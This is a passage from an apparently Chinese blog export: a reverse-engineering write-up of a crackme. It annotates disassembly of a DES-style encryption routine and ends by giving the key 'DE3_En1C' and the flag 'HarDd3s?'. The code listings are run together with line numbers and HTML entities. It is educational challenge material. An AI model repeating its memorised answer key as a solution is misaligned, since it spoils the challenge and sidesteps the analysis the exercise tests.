dword ptr [ebp+var_C], eax mov ecx, ds:dword_42845Cmov dword ptr [ebp+var_C+4], ecxmov dl, ds:byte_428460mov [ebp+var_C+8], dl 将dword_428458的值’_3ED’和dword_42845c的值’C1nE’分配到ptr [ebp+var_C+8]数组空间中，并且按照小端存储方式，最终的数组内容为’DE3_En1C’(即为初始密钥) 接下来为调用scanf函数，按照要求‘give me a string to encrypt’ 输入一串字符Str,判断Str长度，如果长度为8则跳转到 short loc_40111D 1234call _strlenadd esp, 4cmp eax, 8jz short loc_40111D 否则执行system(‘pause’)指令,令eax的值为-1，并跳转到loc_4011A6 12345push offset Command ; &quot;pause&quot;call _systemadd esp, 4or eax, 0FFFFFFFFhjmp loc_4011A6 之后进行整个函数栈的销毁 2. 主函数分析 调用了两个函数，首先对call sub_40100F分析，进入函数 12345678910111213141516171819202122232425262728293031323334353637; Attributes: bp-based framesub_401BE0 proc nearvar_EC= byte ptr -0EChvar_AC= dword ptr -0AChSrc= byte ptr -0A8hvar_78= dword ptr -78hvar_5C= dword ptr -5Chvar_40= byte ptr -40harg_0= dword ptr 8push ebpmov ebp, espsub esp, 0EChpush ebxpush esipush edilea edi, [ebp+var_EC]mov ecx, 3Bhmov eax, 0CCCCCCCChrep stosd //函数栈空间的初始化和分配0ECh大小的空间push 8 //将8压入栈lea eax, [ebp+var_40]push eaxmov ecx, [ebp+arg_0]push ecxcall sub_40101E //调用sub_40101E函数add esp, 0Chlea edx, [ebp+var_78]push edxlea eax, [ebp+var_40]push eaxcall sub_401046 //调用sub_401046函数add esp, 8mov [ebp+var_AC], 0jmp short loc_401C3B 接下来对内部调用的两个函数进行分析 进入sub_40101E函数分析： 第一块同样为初始化，第二块开始为两层循环，第一层判断ecx计数器次数是否等于[ebp+args_8]的值也就是之前压入栈的8，如果大于等于则跳转到loc_401426进行pop栈销毁，否则进入下一层循环，对应loc_4013F4处，判断是否循环少于8次，少于进入循环内部 123456789101112131415mov eax, [ebp+arg_0] //将[ebp+arg_0]变量（第一个参数）赋给eaxadd eax, [ebp+var_4] //eax加上第一层循环的循环变量[ebp+var_4]xor ecx, ecx //ecx清零，也就是第二层循环重新开始mov cl, [eax] //eax值赋给cl段mov edx, ecx //上一层的ecx值赋给edxmov ecx, 7 //ecx的值赋为7sub ecx, [ebp+var_8] //ecx(7)减第二层循环变量[ebp+var_8]sar edx, cl //将edx的值算数右移cl位and edx, 1 //将右移后edx值和1进行按位与运算mov eax, [ebp+var_4] //将第一层循环变量值赋给eaxmov ecx, [ebp+var_8] //将第二层循环变量值赋给ecxlea eax, [ecx+eax*8] //8*eax+ecx并装入eaxmov ecx, [ebp+arg_4] //第二个参数赋给ecxmov [ecx+eax], dl //之前算出(右移，与运算）的dx寄存器内（低8位）的值赋给ecx和eax值的和jmp short loc_4013EB //跳转到loc_4013E8 loc_4013E8函数内进行第二层循环变量自增，loc_4013D1函数内为第一层循环变量的自增。 进入sub_401046函数分析： 直接看第二块循环语句，循环38h(56)次，在循环内： 12345678mov ecx, [ebp+var_4] movsx (带符号扩展) edx, ds:byte_4280EC[ecx]mov eax, [ebp+arg_4] add eax, [ebp+var_4] //第二个形参加上循环变量[ebp+var_4]，并存到eaxmov ecx, [ebp+arg_0]mov dl, [ecx+edx-1] mov [eax], dljmp short loc_401A51 实现的功能为：将byte_4280EC[]数组(最大56轮)的值加上函数第一个形参ecx，再减1，将值存到dl寄存器，再将dl的值赋给eax所指向内存单元的字节数，之后循环变量自增。 回到主函数第二块分析：是一个for循环语句，判断循环变量[ebp+var_AC]的值是否等于（10h)16，如果大于等于16则跳转到loc_401CB9,进行函数栈销毁，小于则进入循环 进入循环内部： 12345678910111213141516171819202122232425262728293031323334mov edx, [ebp+var_AC]movsx eax, ds:byte_428154[edx]push eax ; intlea ecx, [ebp+var_78]push ecx ; intlea edx, [ebp+var_78]push edx ; Srccall sub_401014 //对[ebp+var_78]调用sub_401014函数add esp, 0Chmov eax, [ebp+var_AC]movsx ecx, ds:byte_428154[eax]push ecx ; intlea edx, [ebp+var_5C]push edx ; intlea eax, [ebp+var_5C]push eax ; Srccall sub_401014 //第二次调用sub_401014函数,参数为[ebp+var_5C]和byte_428154[eax]add esp, 0Chlea ecx, [ebp+Src]push ecxlea edx, [ebp+var_78]push edxcall sub_40100A //调用sub_40100A，参数为[ebp+var_78]和Srcadd esp, 8push 30h ; &#x27;0&#x27; ; Size //将48压入栈lea eax, [ebp+Src]push eax ; Srcmov ecx, [ebp+var_AC]imul ecx, 30h ; &#x27;0&#x27; add ecx, offset unk_42DC9C //将ecx计数器的值和48相乘再加上地址为unk_42DC9C处的值，结果存到ecxpush ecx ; void *call _memcpy //调用memcpy函数add esp, 0Chjmp loc_401C2C //之后是循环变量自增 对调用的函数依次分析： 进入sub_401014 对第一块，分配64h大小的空间调用memcpy函数，将Src字符串的内容赋给[ebp+var_1c]数组，将变量[ebp+var_24](用v4表示）初始化为0，接下来为while循环，[ebp+var_20]（用v5表示）为循环变量，循环大小为1Ch即28，在while循环内部 123456789mov ecx, [ebp+arg_4] add ecx, [ebp+var_24] //第二个形参和v4相加，存到ecxmov edx, [ebp+var_20] //v5赋给edxmov al, [ebp+edx+var_1C] //在数组内寻找v5指向的字节，存到al寄存器mov [ecx], al //将al寄存器的值赋给ecx指向在内存的字节mov ecx, [ebp+var_24] add ecx, 1 //v4自增mov [ebp+var_24], ecxjmp short loc_401B49 之后是一个for循环 for循环内，判断循环变量[ebp+var_20]是否大于等于第三个形参[ebp+arg_8]，若大于等于则跳出循环（add esp,64h)，否则和while循环内容实现功能相同。 进入sub_40100A函数 是一个for 循环，循环大小为30h（48），循环变量为[ebp+var_4]（用i表示），先初始化为0 12345678mov ecx, [ebp+var_4]movsx edx, ds:byte_428124[ecx] //按i指向的字节数组byte的对应值赋给edxmov eax, [ebp+arg_4] add eax, [ebp+var_4] //i+第二个参数[ebp+arg_4],存到eaxmov ecx, [ebp+arg_0] //第一个形参存到ecxmov dl, [ecx+edx-1] // edx的值和第一个形参指向内存的字节单元值存到dl寄存器mov [eax], dl //dl寄存器的值赋给eax指向内存的字节单元jmp short loc_401AC1 memcpy函数实现将Src字符串的值赋给ecx寄存器内的值，大小为48u 回到主函数: 轮函数sub_401032分析调用的第二个函数call sub_401032： 第一块： 123456789101112131415161718192021222324252627282930313233343536373839push ebpmov ebp, espsub esp, 0E4hpush ebxpush esipush edilea edi, [ebp+var_E4]mov ecx, 39hmov eax, 0CCCCCCCCh rep stosd //初始化push 8lea eax, [ebp+Src]push eaxmov ecx, [ebp+arg_0]push ecx call sub_40101E //调用sub_40101E函数add esp, 0Chlea edx, [ebp+Src]push edx ; intlea eax, [ebp+Src]push eax ; Srccall sub_401028 //调用sub_401028函数add esp, 8push 20h(32) ; &#x27; &#x27; ; Sizelea ecx, [ebp+Src]push ecx ; Srclea edx, [ebp+var_84]push edx ; void *call _memcpy //add esp, 0Chpush 20h (32); &#x27; &#x27; ; Size lea eax, [ebp+var_24]push eax ; Srclea ecx, [ebp+var_A4]push ecx ; void *call _memcpy //调用两次memcpy函数add esp, 0Chmov [ebp+var_4], 0jmp short loc_40124C 对于sub_40101E函数，之前已经分析过，可知其实现功能为： 对于sub_401028函数 在第一块，先调用了mempy函数将Src内容拷贝给了 第二块为一个循环语句，进行40h（64）轮循环，在每轮循环中，将byte_42801C数组对应得值加上[ebp+var_45]指向内存的值，并将值赋给循环变量[ebp+var_4]和[ebp+arg_4]的和（这里的函数功能与之前的类似，简要说明） 接下来调用了两次memcpy函数 之后进行了15轮循环 观察发现，在循环内和循环外，都调用了sub_401005,sub_401023函数，对于 sub_401005函数： 发现依次调用了sub_40104B, sub_401023, sub_40103C，sub_401037函数，并在最后调用了memcpy函数，将Src的值赋值给了[ebp+arg_4] 依次分析： (i) sub_40104B 首先调用了memcpy函数，将Src的值赋给了[ebp+var_30]，看第二块发现是for循环，循环48次，在循环内 1234567mov eax, [ebp+var_34] //循环变量[ebp+var_34]（用i表示）movsx ecx, ds:byte_42809C[eax] //i对应的byte_42809C的值存到ecxmov edx, [ebp+arg_4]add edx, [ebp+var_34] //i与[ebp+arg_4]相加mov al, byte ptr [ebp+ecx+var_34+3] //ecx+3+i对应的字节数组赋给i与[ebp+arg_4]的和mov [edx], aljmp short loc_401693 (ii) sub_401023函数 同样为一个for循环，循环次数为[ebp+arg_8]对应的值（即32次），在循环内部 1234567891011121314mov edx, [ebp+arg_0] add edx, [ebp+var_4] //循环变量与[ebp+arg_0]相加xor eax, eax //eax清零mov al, [edx] //存到almov ecx, [ebp+arg_4] add ecx, [ebp+var_4] //循环变量与[ebp+arg_4]相加xor edx, edx //edx清零mov dl, [ecx] //存到dladd eax, edx //两次结果相加and eax, 1 //和与1按位与mov ecx, [ebp+arg_0]add ecx, [ebp+var_4] mov [ecx], al //和赋给（循环变量和[ebp+var_arg0]的和）jmp short loc_401921 (iii) sub_40103C 第二块：while循环，[ebp+var_4]为循环变量（用i表示），循环8次，在循环内 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253mov ecx, [ebp+var_4]imul ecx, 6 //6*imov edx, [ebp+arg_0] xor eax, eax //eax清零mov al, [edx+ecx]shl eax, 1 //左移1位mov ecx, [ebp+var_4]imul ecx, 6 //6*imov edx, [ebp+arg_0] xor ebx, ebx //ebx清零mov bl, [edx+ecx+5] //和+5or eax, ebx //eax和ebx进行或运算and eax, 3 //eax和3按位与mov [ebp+var_C], eaxmov eax, [ebp+var_4]imul eax, 6 mov ecx, [ebp+arg_0]xor edx, edxmov dl, [ecx+eax+1]shl edx, 3 //左移3位mov eax, [ebp+var_4]imul eax, 6mov ecx, [ebp+arg_0]xor ebx, ebx //ebx清零mov bl, [ecx+eax+2]shl ebx, 2or edx, ebxmov eax, [ebp+var_4] imul eax, 6 mov ecx, [ebp+arg_0]xor ebx, ebxmov bl, [ecx+eax+3]shl ebx, 1 //左移1位or edx, ebxmov eax, [ebp+var_4]imul eax, 6mov ecx, [ebp+arg_0]xor ebx, ebxmov bl, [ecx+eax+4]or edx, ebxand edx, 0Fh（15） //与15按位与mov [ebp+var_10], edxmov edx, [ebp+var_4]shl edx, 6mov eax, [ebp+var_C]shl eax, 4mov ecx, [ebp+var_10]add ecx, edxmovsx edx, ds:byte_428164[eax+ecx]and edx, 0Fh（15） 123v3 &#x3D; byte_428164[64 * v5 + 16 * ((*(_BYTE *)(a1 + 6 * v5 + 5) | (unsigned __int8)(2 * *(_BYTE *)(a1 + 6 * v5))) &amp; 3) + ((*(_BYTE *)(a1 + 6 * v5 + 4) | (unsigned __int8)((2 * *(_BYTE *)(a1 + 6 * v5 + 3)) | (4 * *(_BYTE *)(a1 + 6 * v5 + 2)) | (8 * *(_BYTE *)(a1 + 6 * v5 + 1)))) &amp; 15)] &amp; 15; 大致运算如上 12345678910111213141516171819202122232425262728mov [ebp+var_14], dlmovsx eax, [ebp+var_14]sar//右移 eax, 3and eax, 1mov ecx, [ebp+arg_4]add ecx, [ebp+var_8]mov [ecx], almovsx edx, [ebp+var_14]sar edx, 2and edx, 1mov eax, [ebp+arg_4]add eax, [ebp+var_8]mov [eax+1], dlmovsx ecx, [ebp+var_14]sar ecx, 1and ecx, 1mov edx, [ebp+arg_4]add edx, [ebp+var_8]mov [edx+2], clmovsx eax, [ebp+var_14]and eax, 1mov ecx, [ebp+arg_4]add ecx, [ebp+var_8]mov [ecx+3], almov edx, [ebp+var_8]add edx, 4mov [ebp+var_8], edxjmp loc_401718 123456*(_BYTE *)(v4 + a2) = (v3 &gt;&gt; 3) &amp; 1; *(_BYTE *)(v4 + a2 + 1) = (v3 &gt;&gt; 2) &amp; 1; *(_BYTE *)(v4 + a2 + 2) = (v3 &gt;&gt; 1) &amp; 1; *(_BYTE *)(v4 + a2 + 3) = v3 &amp; 1; v4 += 4; result = ++v5; 大致运算如上 (iiii) sub_401037 先调用memcpy函数将Src赋值给[ebp+var_20] 之后进行(20h)32轮循环，实现功能与sub_401014类似，这里不做重复说明 在sub_401032函数末尾 返回了sub_40102D函数 有两层for循环，一层循环次数为[ebp+arg_8]，第二层循环次数为7，第一层循环： 12345678mov edx, [ebp+var_4] //第一层循环变量imov eax, [ebp+arg_0]xor ecx, ecxmov cl, [eax+edx*8] and ecx, 1 //([ebp+arg_0]+8*i)与1相与mov byte ptr [ebp+var_C], cl //结果存到[ebp+avr_C]mov [ebp+var_8], 1 //初始化第二层循环变量[ebp+var_8](用j表示)为1jmp short loc_4014A5 跳转到下一层循环： 12345678910111213141516mov eax, [ebp+var_C]and eax, 0FFh shl eax, 1 //eax左移1位即eax乘2 mov byte ptr [ebp+var_C], almov ecx, [ebp+var_C]and ecx, 0FFhmov edx, [ebp+var_4]mov eax, [ebp+var_8]lea edx, [eax+edx*8] //(a+j+8*i)mov eax, [ebp+arg_0]xor ebx, ebxmov bl, [eax+edx] //结果存到bx寄存器低位and ebx, 1 //add ecx, ebxmov byte ptr [ebp+var_C], cl //cl赋给ptr[ebp+var_C]jmp short loc_40149C 到此sub_401032函数分析完毕，可知该函数为16次轮函数 回到主函数： 第二块开始为for循环，[ebp+var2C]为循环变量，循环8次 12345678mov eax, [ebp+var_2C]xor ecx, ecx //ecx清零mov cl, [ebp+eax+var_28] //[ebp+var_28]和eax的和赋给cl,8位密文mov edx, [ebp+var_2C] xor eax, eax mov al, byte_42AA30[edx] //byte数组（0xef,0x34,0xd4,0xa3,0xc6,0x84,0xe4,0x23）赋给alcmp ecx, eax //判断ecx和eax是否相等jz short loc_401188 若不相等则输出 Wrong! 相等则输出G00d Job!! 综上所述初始密钥为：DE3_En1C 运用des解密算法可知明文为：HarDd3s?","categories":[],"tags":[]}],"categories":[{"name":"逆向","slug":"逆向","permalink":"http://k4oer.gitee.io/categories/%E9%80%86%E5%90%91/"}],"tags":[]}